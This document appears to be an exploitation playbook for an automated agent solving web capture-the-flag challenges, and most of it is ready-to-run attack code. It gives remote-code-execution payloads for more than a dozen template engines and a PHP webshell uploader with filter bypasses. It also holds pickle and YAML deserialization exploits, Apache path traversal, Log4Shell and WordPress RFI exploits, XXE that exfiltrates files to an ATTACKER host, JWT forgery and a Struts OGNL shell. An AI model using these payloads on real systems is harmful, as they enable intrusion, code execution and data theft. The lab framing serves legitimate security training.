## General Exploration Playbook

For vulnerability types not covered by specific playbooks, follow this approach:

### SSTI (Server-Side Template Injection)

**Step 1 — Detect SSTI:**
Inject the universal fuzzing string into every input: `${{<%[%'"}}%\`
If the app errors or renders differently, SSTI is likely.

Then test specific engines:
- `{{7*7}}` → `49` = Jinja2, Twig, Nunjucks, or similar
- `${7*7}` → `49` = Mako, FreeMarker, Thymeleaf, or EL
- `<%= 7*7 %>` → `49` = ERB (Ruby), Slim
- `#{7*7}` → `49` = Pug/Jade (Node.js), Spring EL
- `{7*7}` → `49` = Smarty (PHP)
- `{{7*'7'}}` → `7777777` = Jinja2 (confirms vs Twig which returns `49`)

**IMPORTANT:** If you get a `DisallowedHost` error (Django), add `-H 'Host: localhost'` to all requests.

**Step 2 — Identify the engine** from error messages, response behavior, or framework detection (Python→Jinja2/Mako/Django, PHP→Twig/Smarty, Ruby→ERB, Node→Nunjucks/Pug, Java→FreeMarker/Thymeleaf).

**Step 3 — Exploit per engine:**

**⚡ Jinja2 quick escalation (Python/Flask)** — After confirming `{{7*7}}=49`, jump IMMEDIATELY to RCE:
```python
import requests
s = requests.Session()
# Login if needed
s.post('TARGET/login', data={'username': 'demo', 'password': 'demo'})

# RCE payloads — try these in order (fastest to most compatible):
rce_payloads = [
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{joiner.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{namespace.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}",
    # Also try env vars — flag might be there instead of a file
    "{{config.__class__.__init__.__globals__['os'].popen('env').read()}}",
]
for p in rce_payloads:
    r = s.post('TARGET/vulnerable_endpoint', data={'input': p})
    if 'FLAG' in r.text or len(r.text) > 200:
        print(f"Payload: {p}")
        print(r.text)
        break
```
Do NOT stop at `{{config}}` or `{{7*7}}` — always escalate to full RCE.

**Django Templates:**
- The flag may be directly in the template context: try `{{FLAG}}`, `{{flag}}`, `{{secret}}`
- `{{settings.SECRET_KEY}}` — check for flag in settings
- `{{request}}` — may leak useful info
- `{% debug %}` — dumps all context variables, may contain the flag
- `{% load log %}{% get_admin_log 100 as log %}{% for e in log %}{{e.user}}{% endfor %}`
- If you get `DisallowedHost`, add `Host: localhost` header to all requests

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag.txt")}}
{{['cat /flag.txt']|filter('system')}}
{{['id','']|sort('system')}}
```

**Smarty (PHP):**
```
{system('cat /flag.txt')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**FreeMarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("cat /flag.txt")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/flag.txt').toURL().text}
```

**Velocity (Java):**
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('cat /flag.txt'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Thymeleaf (Java/Spring):**
```
${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}
${#rt = @java.lang.Runtime@getRuntime(), #rt.exec('cat /flag.txt')}
```

**Pebble (Java):**
```
{% set cmd = 'cat /flag.txt' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes])}}
```

**ERB (Ruby):**
```
<%= system("cat /flag.txt") %>
<%= `cat /flag.txt` %>
<%= IO.popen("cat /flag.txt").read() %>
```

**Handlebars (Node.js):**
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('cat /flag.txt');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

**Nunjucks (Node.js):**
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```

**PugJs (Node.js):**
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('cat /flag.txt').toString();return sh}()}
```

**Go SSTI:**
```
{{.}}  (dump all template data)
{{printf "%s" "test"}}
```

**SSTI Filter Bypass:**
- `|attr()` filter: `{{''|attr('__class__')}}` instead of `{{''.__class__}}`
- Hex encoding: `{{''['\x5f\x5fclass\x5f\x5f']}}`
- Request object: `{{request.args.cmd}}` with `?cmd=os` in URL params
- String concat: `{{''['__cla'+'ss__']}}` to bypass keyword filters
- `{%set%}` for variable assignment: `{%set a='__cla'%}{%set b='ss__'%}{{''[a~b]}}`

### File Upload / Webshell

**Step 1 — Find upload endpoint** (look for profile image, file import, document upload).

**Step 2 — Discover the uploaded file's URL** — check the response for a file path/URL, or try:
- `/upload/FILENAME`, `/uploads/FILENAME`, `/static/uploads/FILENAME`
- `/images/FILENAME`, `/media/FILENAME`, `/files/FILENAME`

**Step 3 — Upload a webshell:**
```python
import requests
s = requests.Session()
# Login if needed
s.post('TARGET/login', data={'username': 'test', 'password': 'test'})
# Upload PHP webshell
shell_content = b'<?php system($_GET["cmd"]); ?>'
files = {'file': ('shell.php', shell_content, 'image/jpeg')}
r = s.post('TARGET/upload', files=files)
print(r.text)  # Look for the upload path
# Access the shell
r = requests.get('TARGET/uploads/shell.php?cmd=cat+/flag.txt')
print(r.text)
```

**Extension bypass techniques** (try in order):
1. **Double extension**: `shell.jpg.php` — if the filter checks with `strpos('.jpg')` instead of end-of-string match, `.jpg` anywhere in the name passes but Apache executes `.php` as the LAST extension
2. **Alternative extensions**: `.php5`, `.phtml`, `.phar`, `.php7`, `.phps`
3. **Null byte**: `shell.php%00.jpg` — PHP may truncate at null byte
4. **Case variation**: `shell.PhP`, `shell.PHP`, `shell.Php`
5. **Trailing chars**: `shell.php.`, `shell.php `, `shell.php::$DATA` (Windows)
6. **Content-type**: Set to `image/jpeg` or `image/png` regardless of actual content

**Magic bytes / signature bypass** — if the app checks file headers (magic numbers):
```python
# JPEG magic: FF D8 FF
payload = b'\xff\xd8\xff' + b'<?php system($_GET["cmd"]); ?>'
# or for getenv:
payload = b'\xff\xd8\xff' + b'<?php echo getenv("FLAG"); ?>'
files = {'userfile': ('shell.jpg.php', payload, 'image/jpeg')}
```
The app checks the first 2-3 bytes for JPEG signature (FF D8), but Apache ignores the magic bytes and executes based on the `.php` extension.

**IMPORTANT — Flag in environment variable**: If the Dockerfile uses `ENV FLAG=$FLAG` (not writing to a file), you need `getenv('FLAG')` or `$_ENV['FLAG']` instead of `cat /flag.txt`:
```php
<?php echo getenv('FLAG'); ?>
<?php echo $_ENV['FLAG']; ?>
<?php system('env | grep FLAG'); ?>
```

**For Python apps (pickle upload for RCE):**
```python
import requests, pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt > /tmp/out.txt',))
payload = pickle.dumps(Exploit())
files = {'file': ('exploit.pkl', payload, 'application/octet-stream')}
requests.post('TARGET/upload', files=files)
```

### CVE Exploitation

When the challenge is tagged with `cve`, version numbers in server headers, error pages, or tech stack detection are key:

**Step 1 — Identify the software and version:**
```bash
curl -sI TARGET           # Server header (e.g., Apache/2.4.50)
whatweb TARGET            # Fingerprint technology stack
nuclei -u TARGET -as      # Auto-detect known vulns
```
Check for: Apache, Nginx, WordPress, PHP version, Node.js, specific CMS/plugin versions.

**Step 2 — Search for known exploits:**
```bash
searchsploit apache 2.4.50      # Local exploit-db search
nuclei -u TARGET -t cves/       # CVE-specific nuclei templates
```

**Common CVEs to recognize:**
- **Apache 2.4.49/2.4.50** → CVE-2021-41773/CVE-2021-42013: Path traversal with double-URL-encoding
  ```bash
  # Double-encoded ../ : %%32%65%%32%65 = ../
  curl -s --path-as-is "TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh" -d "echo; cat /FLAG.txt"
  curl -s --path-as-is "TARGET/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/FLAG.txt"
  ```
- **WordPress plugins**: Check `/wp-content/plugins/PLUGINNAME/readme.txt` for version, then search CVE
  - **Canto plugin** (CVE-2023-3452): `/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=RFI_URL`
  - **WPScan quick check**: `wpscan --url TARGET --enumerate ap --plugins-detection aggressive`
  - **Manual plugin enumeration** — try these paths:
    ```bash
    for plugin in canto flavor flavor_forge contact-form-7 akismet classic-editor; do
      curl -sI "TARGET/wp-content/plugins/$plugin/" | head -1
    done
    ```
  - Vulnerable plugin files may have unauthenticated `require_once($_REQUEST['param'])` calls → Remote File Inclusion
- **Log4Shell (CVE-2021-44228)**: `${jndi:ldap://ATTACKER/a}` in any logged input
- **Spring4Shell (CVE-2022-22965)**: Class loader manipulation in Spring MVC

**Step 3 — For Remote File Inclusion (RFI) via WordPress plugins:**
```python
import http.server, threading, requests, os

# 1. Create the file structure the target expects
# If require_once($param . '/wp-admin/admin.php'), serve at /wp-admin/admin.php
os.makedirs('/tmp/rfi_server/wp-admin', exist_ok=True)
with open('/tmp/rfi_server/wp-admin/admin.php', 'w') as f:
    f.write('<?php echo file_get_contents("/FLAG.txt"); exit; ?>')

# 2. Start server on port 8888 (this port is mapped to the host)
os.chdir('/tmp/rfi_server')
handler = http.server.SimpleHTTPRequestHandler
threading.Thread(target=lambda: http.server.HTTPServer(('0.0.0.0', 8888), handler).serve_forever(), daemon=True).start()

# 3. Find the IP to use for RFI callback
# The target container can reach our server via host.docker.internal:8888
# Also try the Docker bridge gateway: 172.17.0.1, 172.133.0.1, or gateway from route
import subprocess
gw = subprocess.check_output("ip route | grep default | awk '{print $3}'", shell=True).decode().strip()
print(f"Gateway IP: {gw}")

# 4. Trigger RFI — try multiple IPs
for ip in ['host.docker.internal', gw, '172.17.0.1', '172.133.0.1']:
    url = f'http://{ip}:8888'
    rfi_url = f'TARGET/wp-content/plugins/canto/includes/lib/download.php?wp_abspath={url}'
    r = requests.get(rfi_url)
    print(f"RFI via {ip}: {r.status_code} — {r.text[:500]}")
    if 'FLAG' in r.text or 'flag' in r.text:
        break
```
**IMPORTANT**: For RFI, you must serve the file at the correct sub-path. If the vulnerable code does `require_once($param . '/wp-admin/admin.php')`, your server must respond on the path `/wp-admin/admin.php`. Use the `os.chdir` approach above to serve the correct directory structure.

### JWT Attacks

**Step 1 — Find JWT tokens:**
Look in cookies, Authorization headers, API responses. Decode at jwt.io or:
```bash
echo 'HEADER.PAYLOAD.SIG' | cut -d. -f2 | base64 -d 2>/dev/null
```

**Step 2 — Attack the JWT:**
- **Algorithm confusion (alg: none)**: `{"alg":"none","typ":"JWT"}` with empty signature
- **Weak secret**: Use hashcat/john: `hashcat -m 16500 jwt.txt rockyou.txt`
- **Leaked secret**: Check `.env` files, source code, config endpoints, S3 buckets, database backups
- **Algorithm confusion (RS256→HS256)**: Use the public key as HMAC secret

**Step 3 — Forge JWT with discovered secret:**
```python
import jwt  # pip install PyJWT
token = jwt.encode({"uid": "MASTER_UID", "role": "admin", "isMaster": 1}, SECRET_KEY, algorithm="HS256")
# Use: requests.get('TARGET/admin', cookies={'token': token})
```

**Step 4 — Find secrets via information disclosure:**
- **S3 bucket listing**: Try ports 8333, 9000 (minio), 4566 (localstack) — `curl TARGET:8333/`
- **Database backups**: Download `.db`, `.sql`, `.sqlite` files from S3/backup endpoints
- **Source code**: Check `/source`, `/.env`, `/.git/config`, `/api/config`
- **Admin panel**: Try `/admin`, `/adminpanel`, `/dashboard`, `/panel`

### Path Traversal / LFI

**Step 1 — Find inclusion point:** URL params like `?page=`, `?file=`, `?template=`, `?path=`, `?id=`

**Step 2 — Test traversal:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Step 3 — Read flag:**
- `../../../flag.txt`, `../../../FLAG.txt`, `../../../app/FLAG.txt`, `../../../tmp/flag.txt`
- `../../../opt/flag.txt`, `../../../home/flag.txt`

**⚡ PHP LFI — ALWAYS try PHP filter wrappers first (before anything else):**
If you can include a PHP file but it executes instead of showing source, use filter wrappers:
```
?page=php://filter/convert.base64-encode/resource=FLAG.php
?page=php://filter/convert.base64-encode/resource=../FLAG.php
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=index.php
```
Then decode: `echo BASE64_OUTPUT | base64 -d`

This is critical: if you include a PHP file containing `<?php $flag = "FLAG{...}" ?>`, the PHP executes and you see nothing. The filter wrapper reads the SOURCE CODE as base64.

**PHP Log Poisoning (when filter wrappers fail):**
1. Inject PHP code via User-Agent: `curl -H "User-Agent: <?php system('cat /flag.txt'); ?>" TARGET/`
2. Then include the access log: `?page=../../../var/log/apache2/access.log`
3. Also try: `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/proc/self/environ`

**Nginx Alias Path Traversal:**
Test for misconfigured nginx `alias` directives (no trailing slash on `location`):
```
curl TARGET/admin../flag.txt
curl TARGET/static../etc/passwd
curl TARGET/images../flag.txt
```
This is **CVE-2009-2629 / nginx off-by-slash** — a `location /X { alias /Y/; }` directive without a trailing slash on the location lets `/X..` traverse out of the aliased directory. Enumerate likely location prefixes (`admin`, `static`, `images`, `assets`, `files`, `uploads`, `media`) and pair each with `/etc/passwd` (to confirm) plus the candidate flag-path list.

### XXE (XML External Entity)

**Step 1 — Find XML input:** SOAP endpoints, XML APIs, file uploads (SVG, DOCX, XLSX, RSS), Content-Type headers.

**Content-Type switching** (if endpoint accepts form data or JSON, try XML):
```python
import requests
# Switch from form/JSON to XML
xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><root>&xxe;</root>'
r = requests.post('TARGET/api', data=xxe, headers={'Content-Type': 'application/xml'})
# Or text/xml, or even replace JSON body with XML
```

**Step 2 — Classic XXE (file read):**
```python
import requests
xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>&xxe;</root>'''
r = requests.post('TARGET/api', data=xxe, headers={'Content-Type': 'application/xml'})
print(r.text)
```

**XInclude (when you don't control the entire XML document, only a value):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///flag.txt"/>
</foo>
```

**SVG XXE (for image upload that accepts SVG):**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**Office XML XXE (DOCX/XLSX):**
```bash
# XLSX/DOCX are zips — unzip, inject XXE into [Content_Types].xml or xl/worksheets/sheet1.xml
mkdir xxe_doc && cd xxe_doc
unzip ../legit.xlsx
# Edit [Content_Types].xml:
# Add <!DOCTYPE Types [<!ENTITY xxe SYSTEM "file:///flag.txt">]> and &xxe; reference
zip -r ../evil.xlsx .
# Upload the modified file
```

**Step 3 — Blind XXE (no output returned):**

**Out-of-band via parameter entities:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- evil.dtd hosted on attacker: -->
<!-- <!ENTITY % file SYSTEM "file:///flag.txt">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
     %eval;
     %exfil; -->
```

**Error-based XXE (using system DTD redefinition):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///flag.txt">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root>test</root>
```
Common system DTD paths: `/usr/share/yelp/dtd/docbookx.dtd` (Linux), `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd` (Tomcat)

**Step 4 — XXE WAF Bypass:**
- Base64 encoding: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`
- UTF-7: `<?xml version="1.0" encoding="UTF-7"?>` then use UTF-7 encoded payload
- HTML entities: encode `SYSTEM` or `file://` with HTML entity references
- Parameter entities: `%xxe;` instead of `&xxe;` (sometimes bypasses entity filters)

**PHP-specific XXE:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!-- Result will be base64 — decode it -->
```

**Flag paths to try:** `/flag.txt`, `/FLAG.txt`, `/app/flag.txt`, `/app/FLAG.txt`, `/opt/flag.txt`, `/tmp/flag.txt`, `/etc/flag`, `/etc/passwd` (to confirm XXE works)

### Insecure Deserialization

**Python pickle** — frequently seen in CTF / pentest contexts:
```python
import pickle, base64, os, requests

# IMPORTANT: Use eval() not os.system() so the result is RETURNED and displayed:
class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat /flag.txt').read()",))
# If the app uses base64-encoded pickle cookies:
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
r = requests.get('TARGET/', cookies={'session': payload})
print(r.text)  # The deserialized result appears in the response

# Also try reading env vars (flag may be there):
class ExploitEnv:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('env').read()",))
payload_env = base64.b64encode(pickle.dumps(ExploitEnv())).decode()
r = requests.get('TARGET/list', cookies={'bookmarks': payload_env})
print(r.text)
```
CRITICAL: Use `eval()` with `__import__('os').popen('CMD').read()` instead of `os.system()`. `os.system()` returns an int (exit code), not the command output. The deserialized object's return value gets rendered on the page.

**Python YAML deserialization** (unsafe `yaml.load`):
```python
import base64, requests
# These payloads exploit unsafe yaml.load() (Loader=yaml.Loader or yaml.FullLoader < 5.1):
payloads = [
    '!!python/object/apply:os.popen ["cat /flag.txt"]',
    '!!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]',
    '!!python/object/apply:os.popen ["env"]',  # Flag may be in env vars
]
for p in payloads:
    cookie = base64.b64encode(p.encode()).decode()
    r = requests.get('TARGET/list', cookies={'bookmarks': cookie})
    if 'FLAG' in r.text or len(r.text) > 200:
        print(r.text)
        break
```

**PHP deserialization:**
- Look for `unserialize()` in source — manipulate serialized objects
- Check cookies for base64-encoded serialized data: `base64_decode()` → `unserialize()`
- Modify class properties: `O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`
- If comparison uses `==` (loose), replace string with `b:1;` (boolean true) to bypass
- PHP type juggling in deserialized data: `s:8:"password";b:1;` makes password=true, which `== "any_string"` is true

**PHP Phar deserialization:**
If the app uses `file_get_contents('phar://...')`, `file_exists()`, `is_file()`, or similar PHP file functions with user-controlled paths:
1. Craft a phar archive with a serialized gadget in metadata
2. Upload the phar file (possibly disguised as another file type)
3. Trigger the phar:// operation to deserialize the metadata
4. Look for `__wakeup()` or `__destruct()` methods with dangerous operations (eval, system)

### JWT Attacks

**Step 1 — Decode the token:**
```python
import base64, json
token = "eyJ..."  # From cookie or Authorization header
parts = token.split('.')
for i, p in enumerate(parts[:2]):
    padded = p + '=' * (4 - len(p) % 4)
    print(f"Part {i}: {json.loads(base64.b64decode(padded))}")
```

**Step 2 — Attack:**

**`alg: none` attack** (works if server doesn't validate algorithm):
```python
import base64, json, requests
header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub": "admin", "role": "admin", "user_id": 1}).encode()).decode().rstrip('=')
forged = f"{header}.{payload}."
requests.get('TARGET/api/flag', cookies={'token': forged})
```

**Weak secret** — try common passwords: `secret`, `password`, `123456`, `key`, the app name
```bash
# Using python3 to brute-force
python3 -c "
import jwt
token = 'YOUR_TOKEN'
for secret in ['secret', 'password', '123456', 'key', 'admin', 'jwt_secret']:
    try:
        data = jwt.decode(token, secret, algorithms=['HS256'])
        print(f'Secret: {secret}, Data: {data}')
        break
    except: pass
"
```

**Modify claims:** Change `role` to `admin`, `user_id` to `1`, `is_admin` to `true`, then re-sign.

### Default Credentials / Information Disclosure

- Always try: `admin/admin`, `admin/password`, `admin/admin123`, `root/root`, `test/test`, `demo/demo`, `user/user`
- **Check HTML source comments** — credentials are often hidden in comments (`<!-- test1:test1 -->`)
- Check `/robots.txt`, `/.env`, `/config`, `/debug`, `/.git/config`
- Look for passwords in source code, comments, config files
- Registration: try adding `role=admin` or `is_admin=true` in POST body

### CVE Exploitation
- Identify technology + version from headers, error pages, or source code
- `searchsploit <software> <version>` — find known exploits
- WordPress: `wpscan --url TARGET --enumerate vp,vt,u` — find vulnerable plugins/themes/users
- After finding a WP plugin, check: `curl TARGET/wp-content/plugins/PLUGIN_NAME/readme.txt` for version
- Apache path traversal (CVE-2021-41773): `curl TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd`
- Try `nuclei -u TARGET` for automated CVE scanning

### Struts2 / OGNL Injection
For Apache Struts2 apps (identified by `.action` or `.do` URLs):
- Test OGNL injection with `%{...}` syntax in parameters
- Key detection: `%{7*7}` in a parameter → check if `49` appears in response
- RCE payload using `TextParseUtil.translateVariables()`:
```
%{#context['xwork.MethodAccessor.denyMethodExecution']=false,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /tmp/flag.txt').getInputStream())}
```
- Alternative: `%{(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`
- Once RCE is confirmed, enumerate flag candidates with the standard list (`ls -la / /tmp /opt /var/www/html 2>/dev/null; find / -maxdepth 4 -name 'flag*' -o -name 'FLAG*' 2>/dev/null`)

### PHP Type Juggling / Magic Hashes
When PHP uses `==` (loose comparison) instead of `===` (strict), type juggling attacks work:
- Hash starting with `0e` followed by all digits is treated as `0` in scientific notation
- `md5('QNKCDZO') == md5('anything_with_0e_hash')` → both are `0` → `true`
- Known magic MD5 values (md5 starts with `0e` + all digits): `QNKCDZO`, `240610708`, `s878926199a`, `s155964671a`, `s214587387a`, `aabg7XSs`
- Known magic SHA1 values: `aaroZmOk`, `aaK1STfY`, `aaO8zKZF`
- If you see a hash like `0e678703625362188185747119782643`, try these magic strings as the password
- Also try: `true` as boolean, `0` as integer, `[]` as array — all exploit loose comparison

### AES-CBC Bit-Flipping (Crypto)
When the app encrypts data with AES-CBC and has no MAC/HMAC integrity check:
```python
import requests, binascii

# 1. Login as known user to get encrypted cookie
s = requests.Session()
r = s.post('TARGET/login', data={'username': 'test1', 'password': 'test1'}, allow_redirects=False)
cookie = s.cookies.get('session')  # hex or base64 encoded

# 2. Decode cookie (IV + ciphertext)
data = bytes.fromhex(cookie)  # or base64.b64decode(cookie)
iv = bytearray(data[:16])
ct = data[16:]

# 3. XOR IV to change plaintext (same-length strings only)
old_text = b'test1'  # current username in first block
new_text = b'admin'  # desired username
for i in range(len(old_text)):
    iv[i] ^= old_text[i] ^ new_text[i]

# 4. Send modified cookie
modified = bytes(iv) + ct
new_cookie = modified.hex()  # or base64.b64encode(modified).decode()
r = requests.get('TARGET/welcome', cookies={'session': new_cookie})
print(r.text)
```
Key insight: `new_iv[i] = old_iv[i] XOR old_plaintext[i] XOR desired_plaintext[i]`

### Multi-Service Architecture Exploitation
For apps with multiple services (nginx + flask + API, or similar):
1. **Map all endpoints** — look for set/get patterns: `/api/set`, `/api/get`, `/config/update`
2. **Trace data flow** — which service fetches from URLs? Which stores data?
3. **Find controllable URLs** — endpoints that let you SET where another service fetches data from
4. **Chain the attack**: control URL → control fetched data → trigger unsafe operation (eval, deserialize, include)
5. **Use one service to host payloads for another** — e.g., set a name endpoint to a JSON exploit payload, then point the API URL to that endpoint
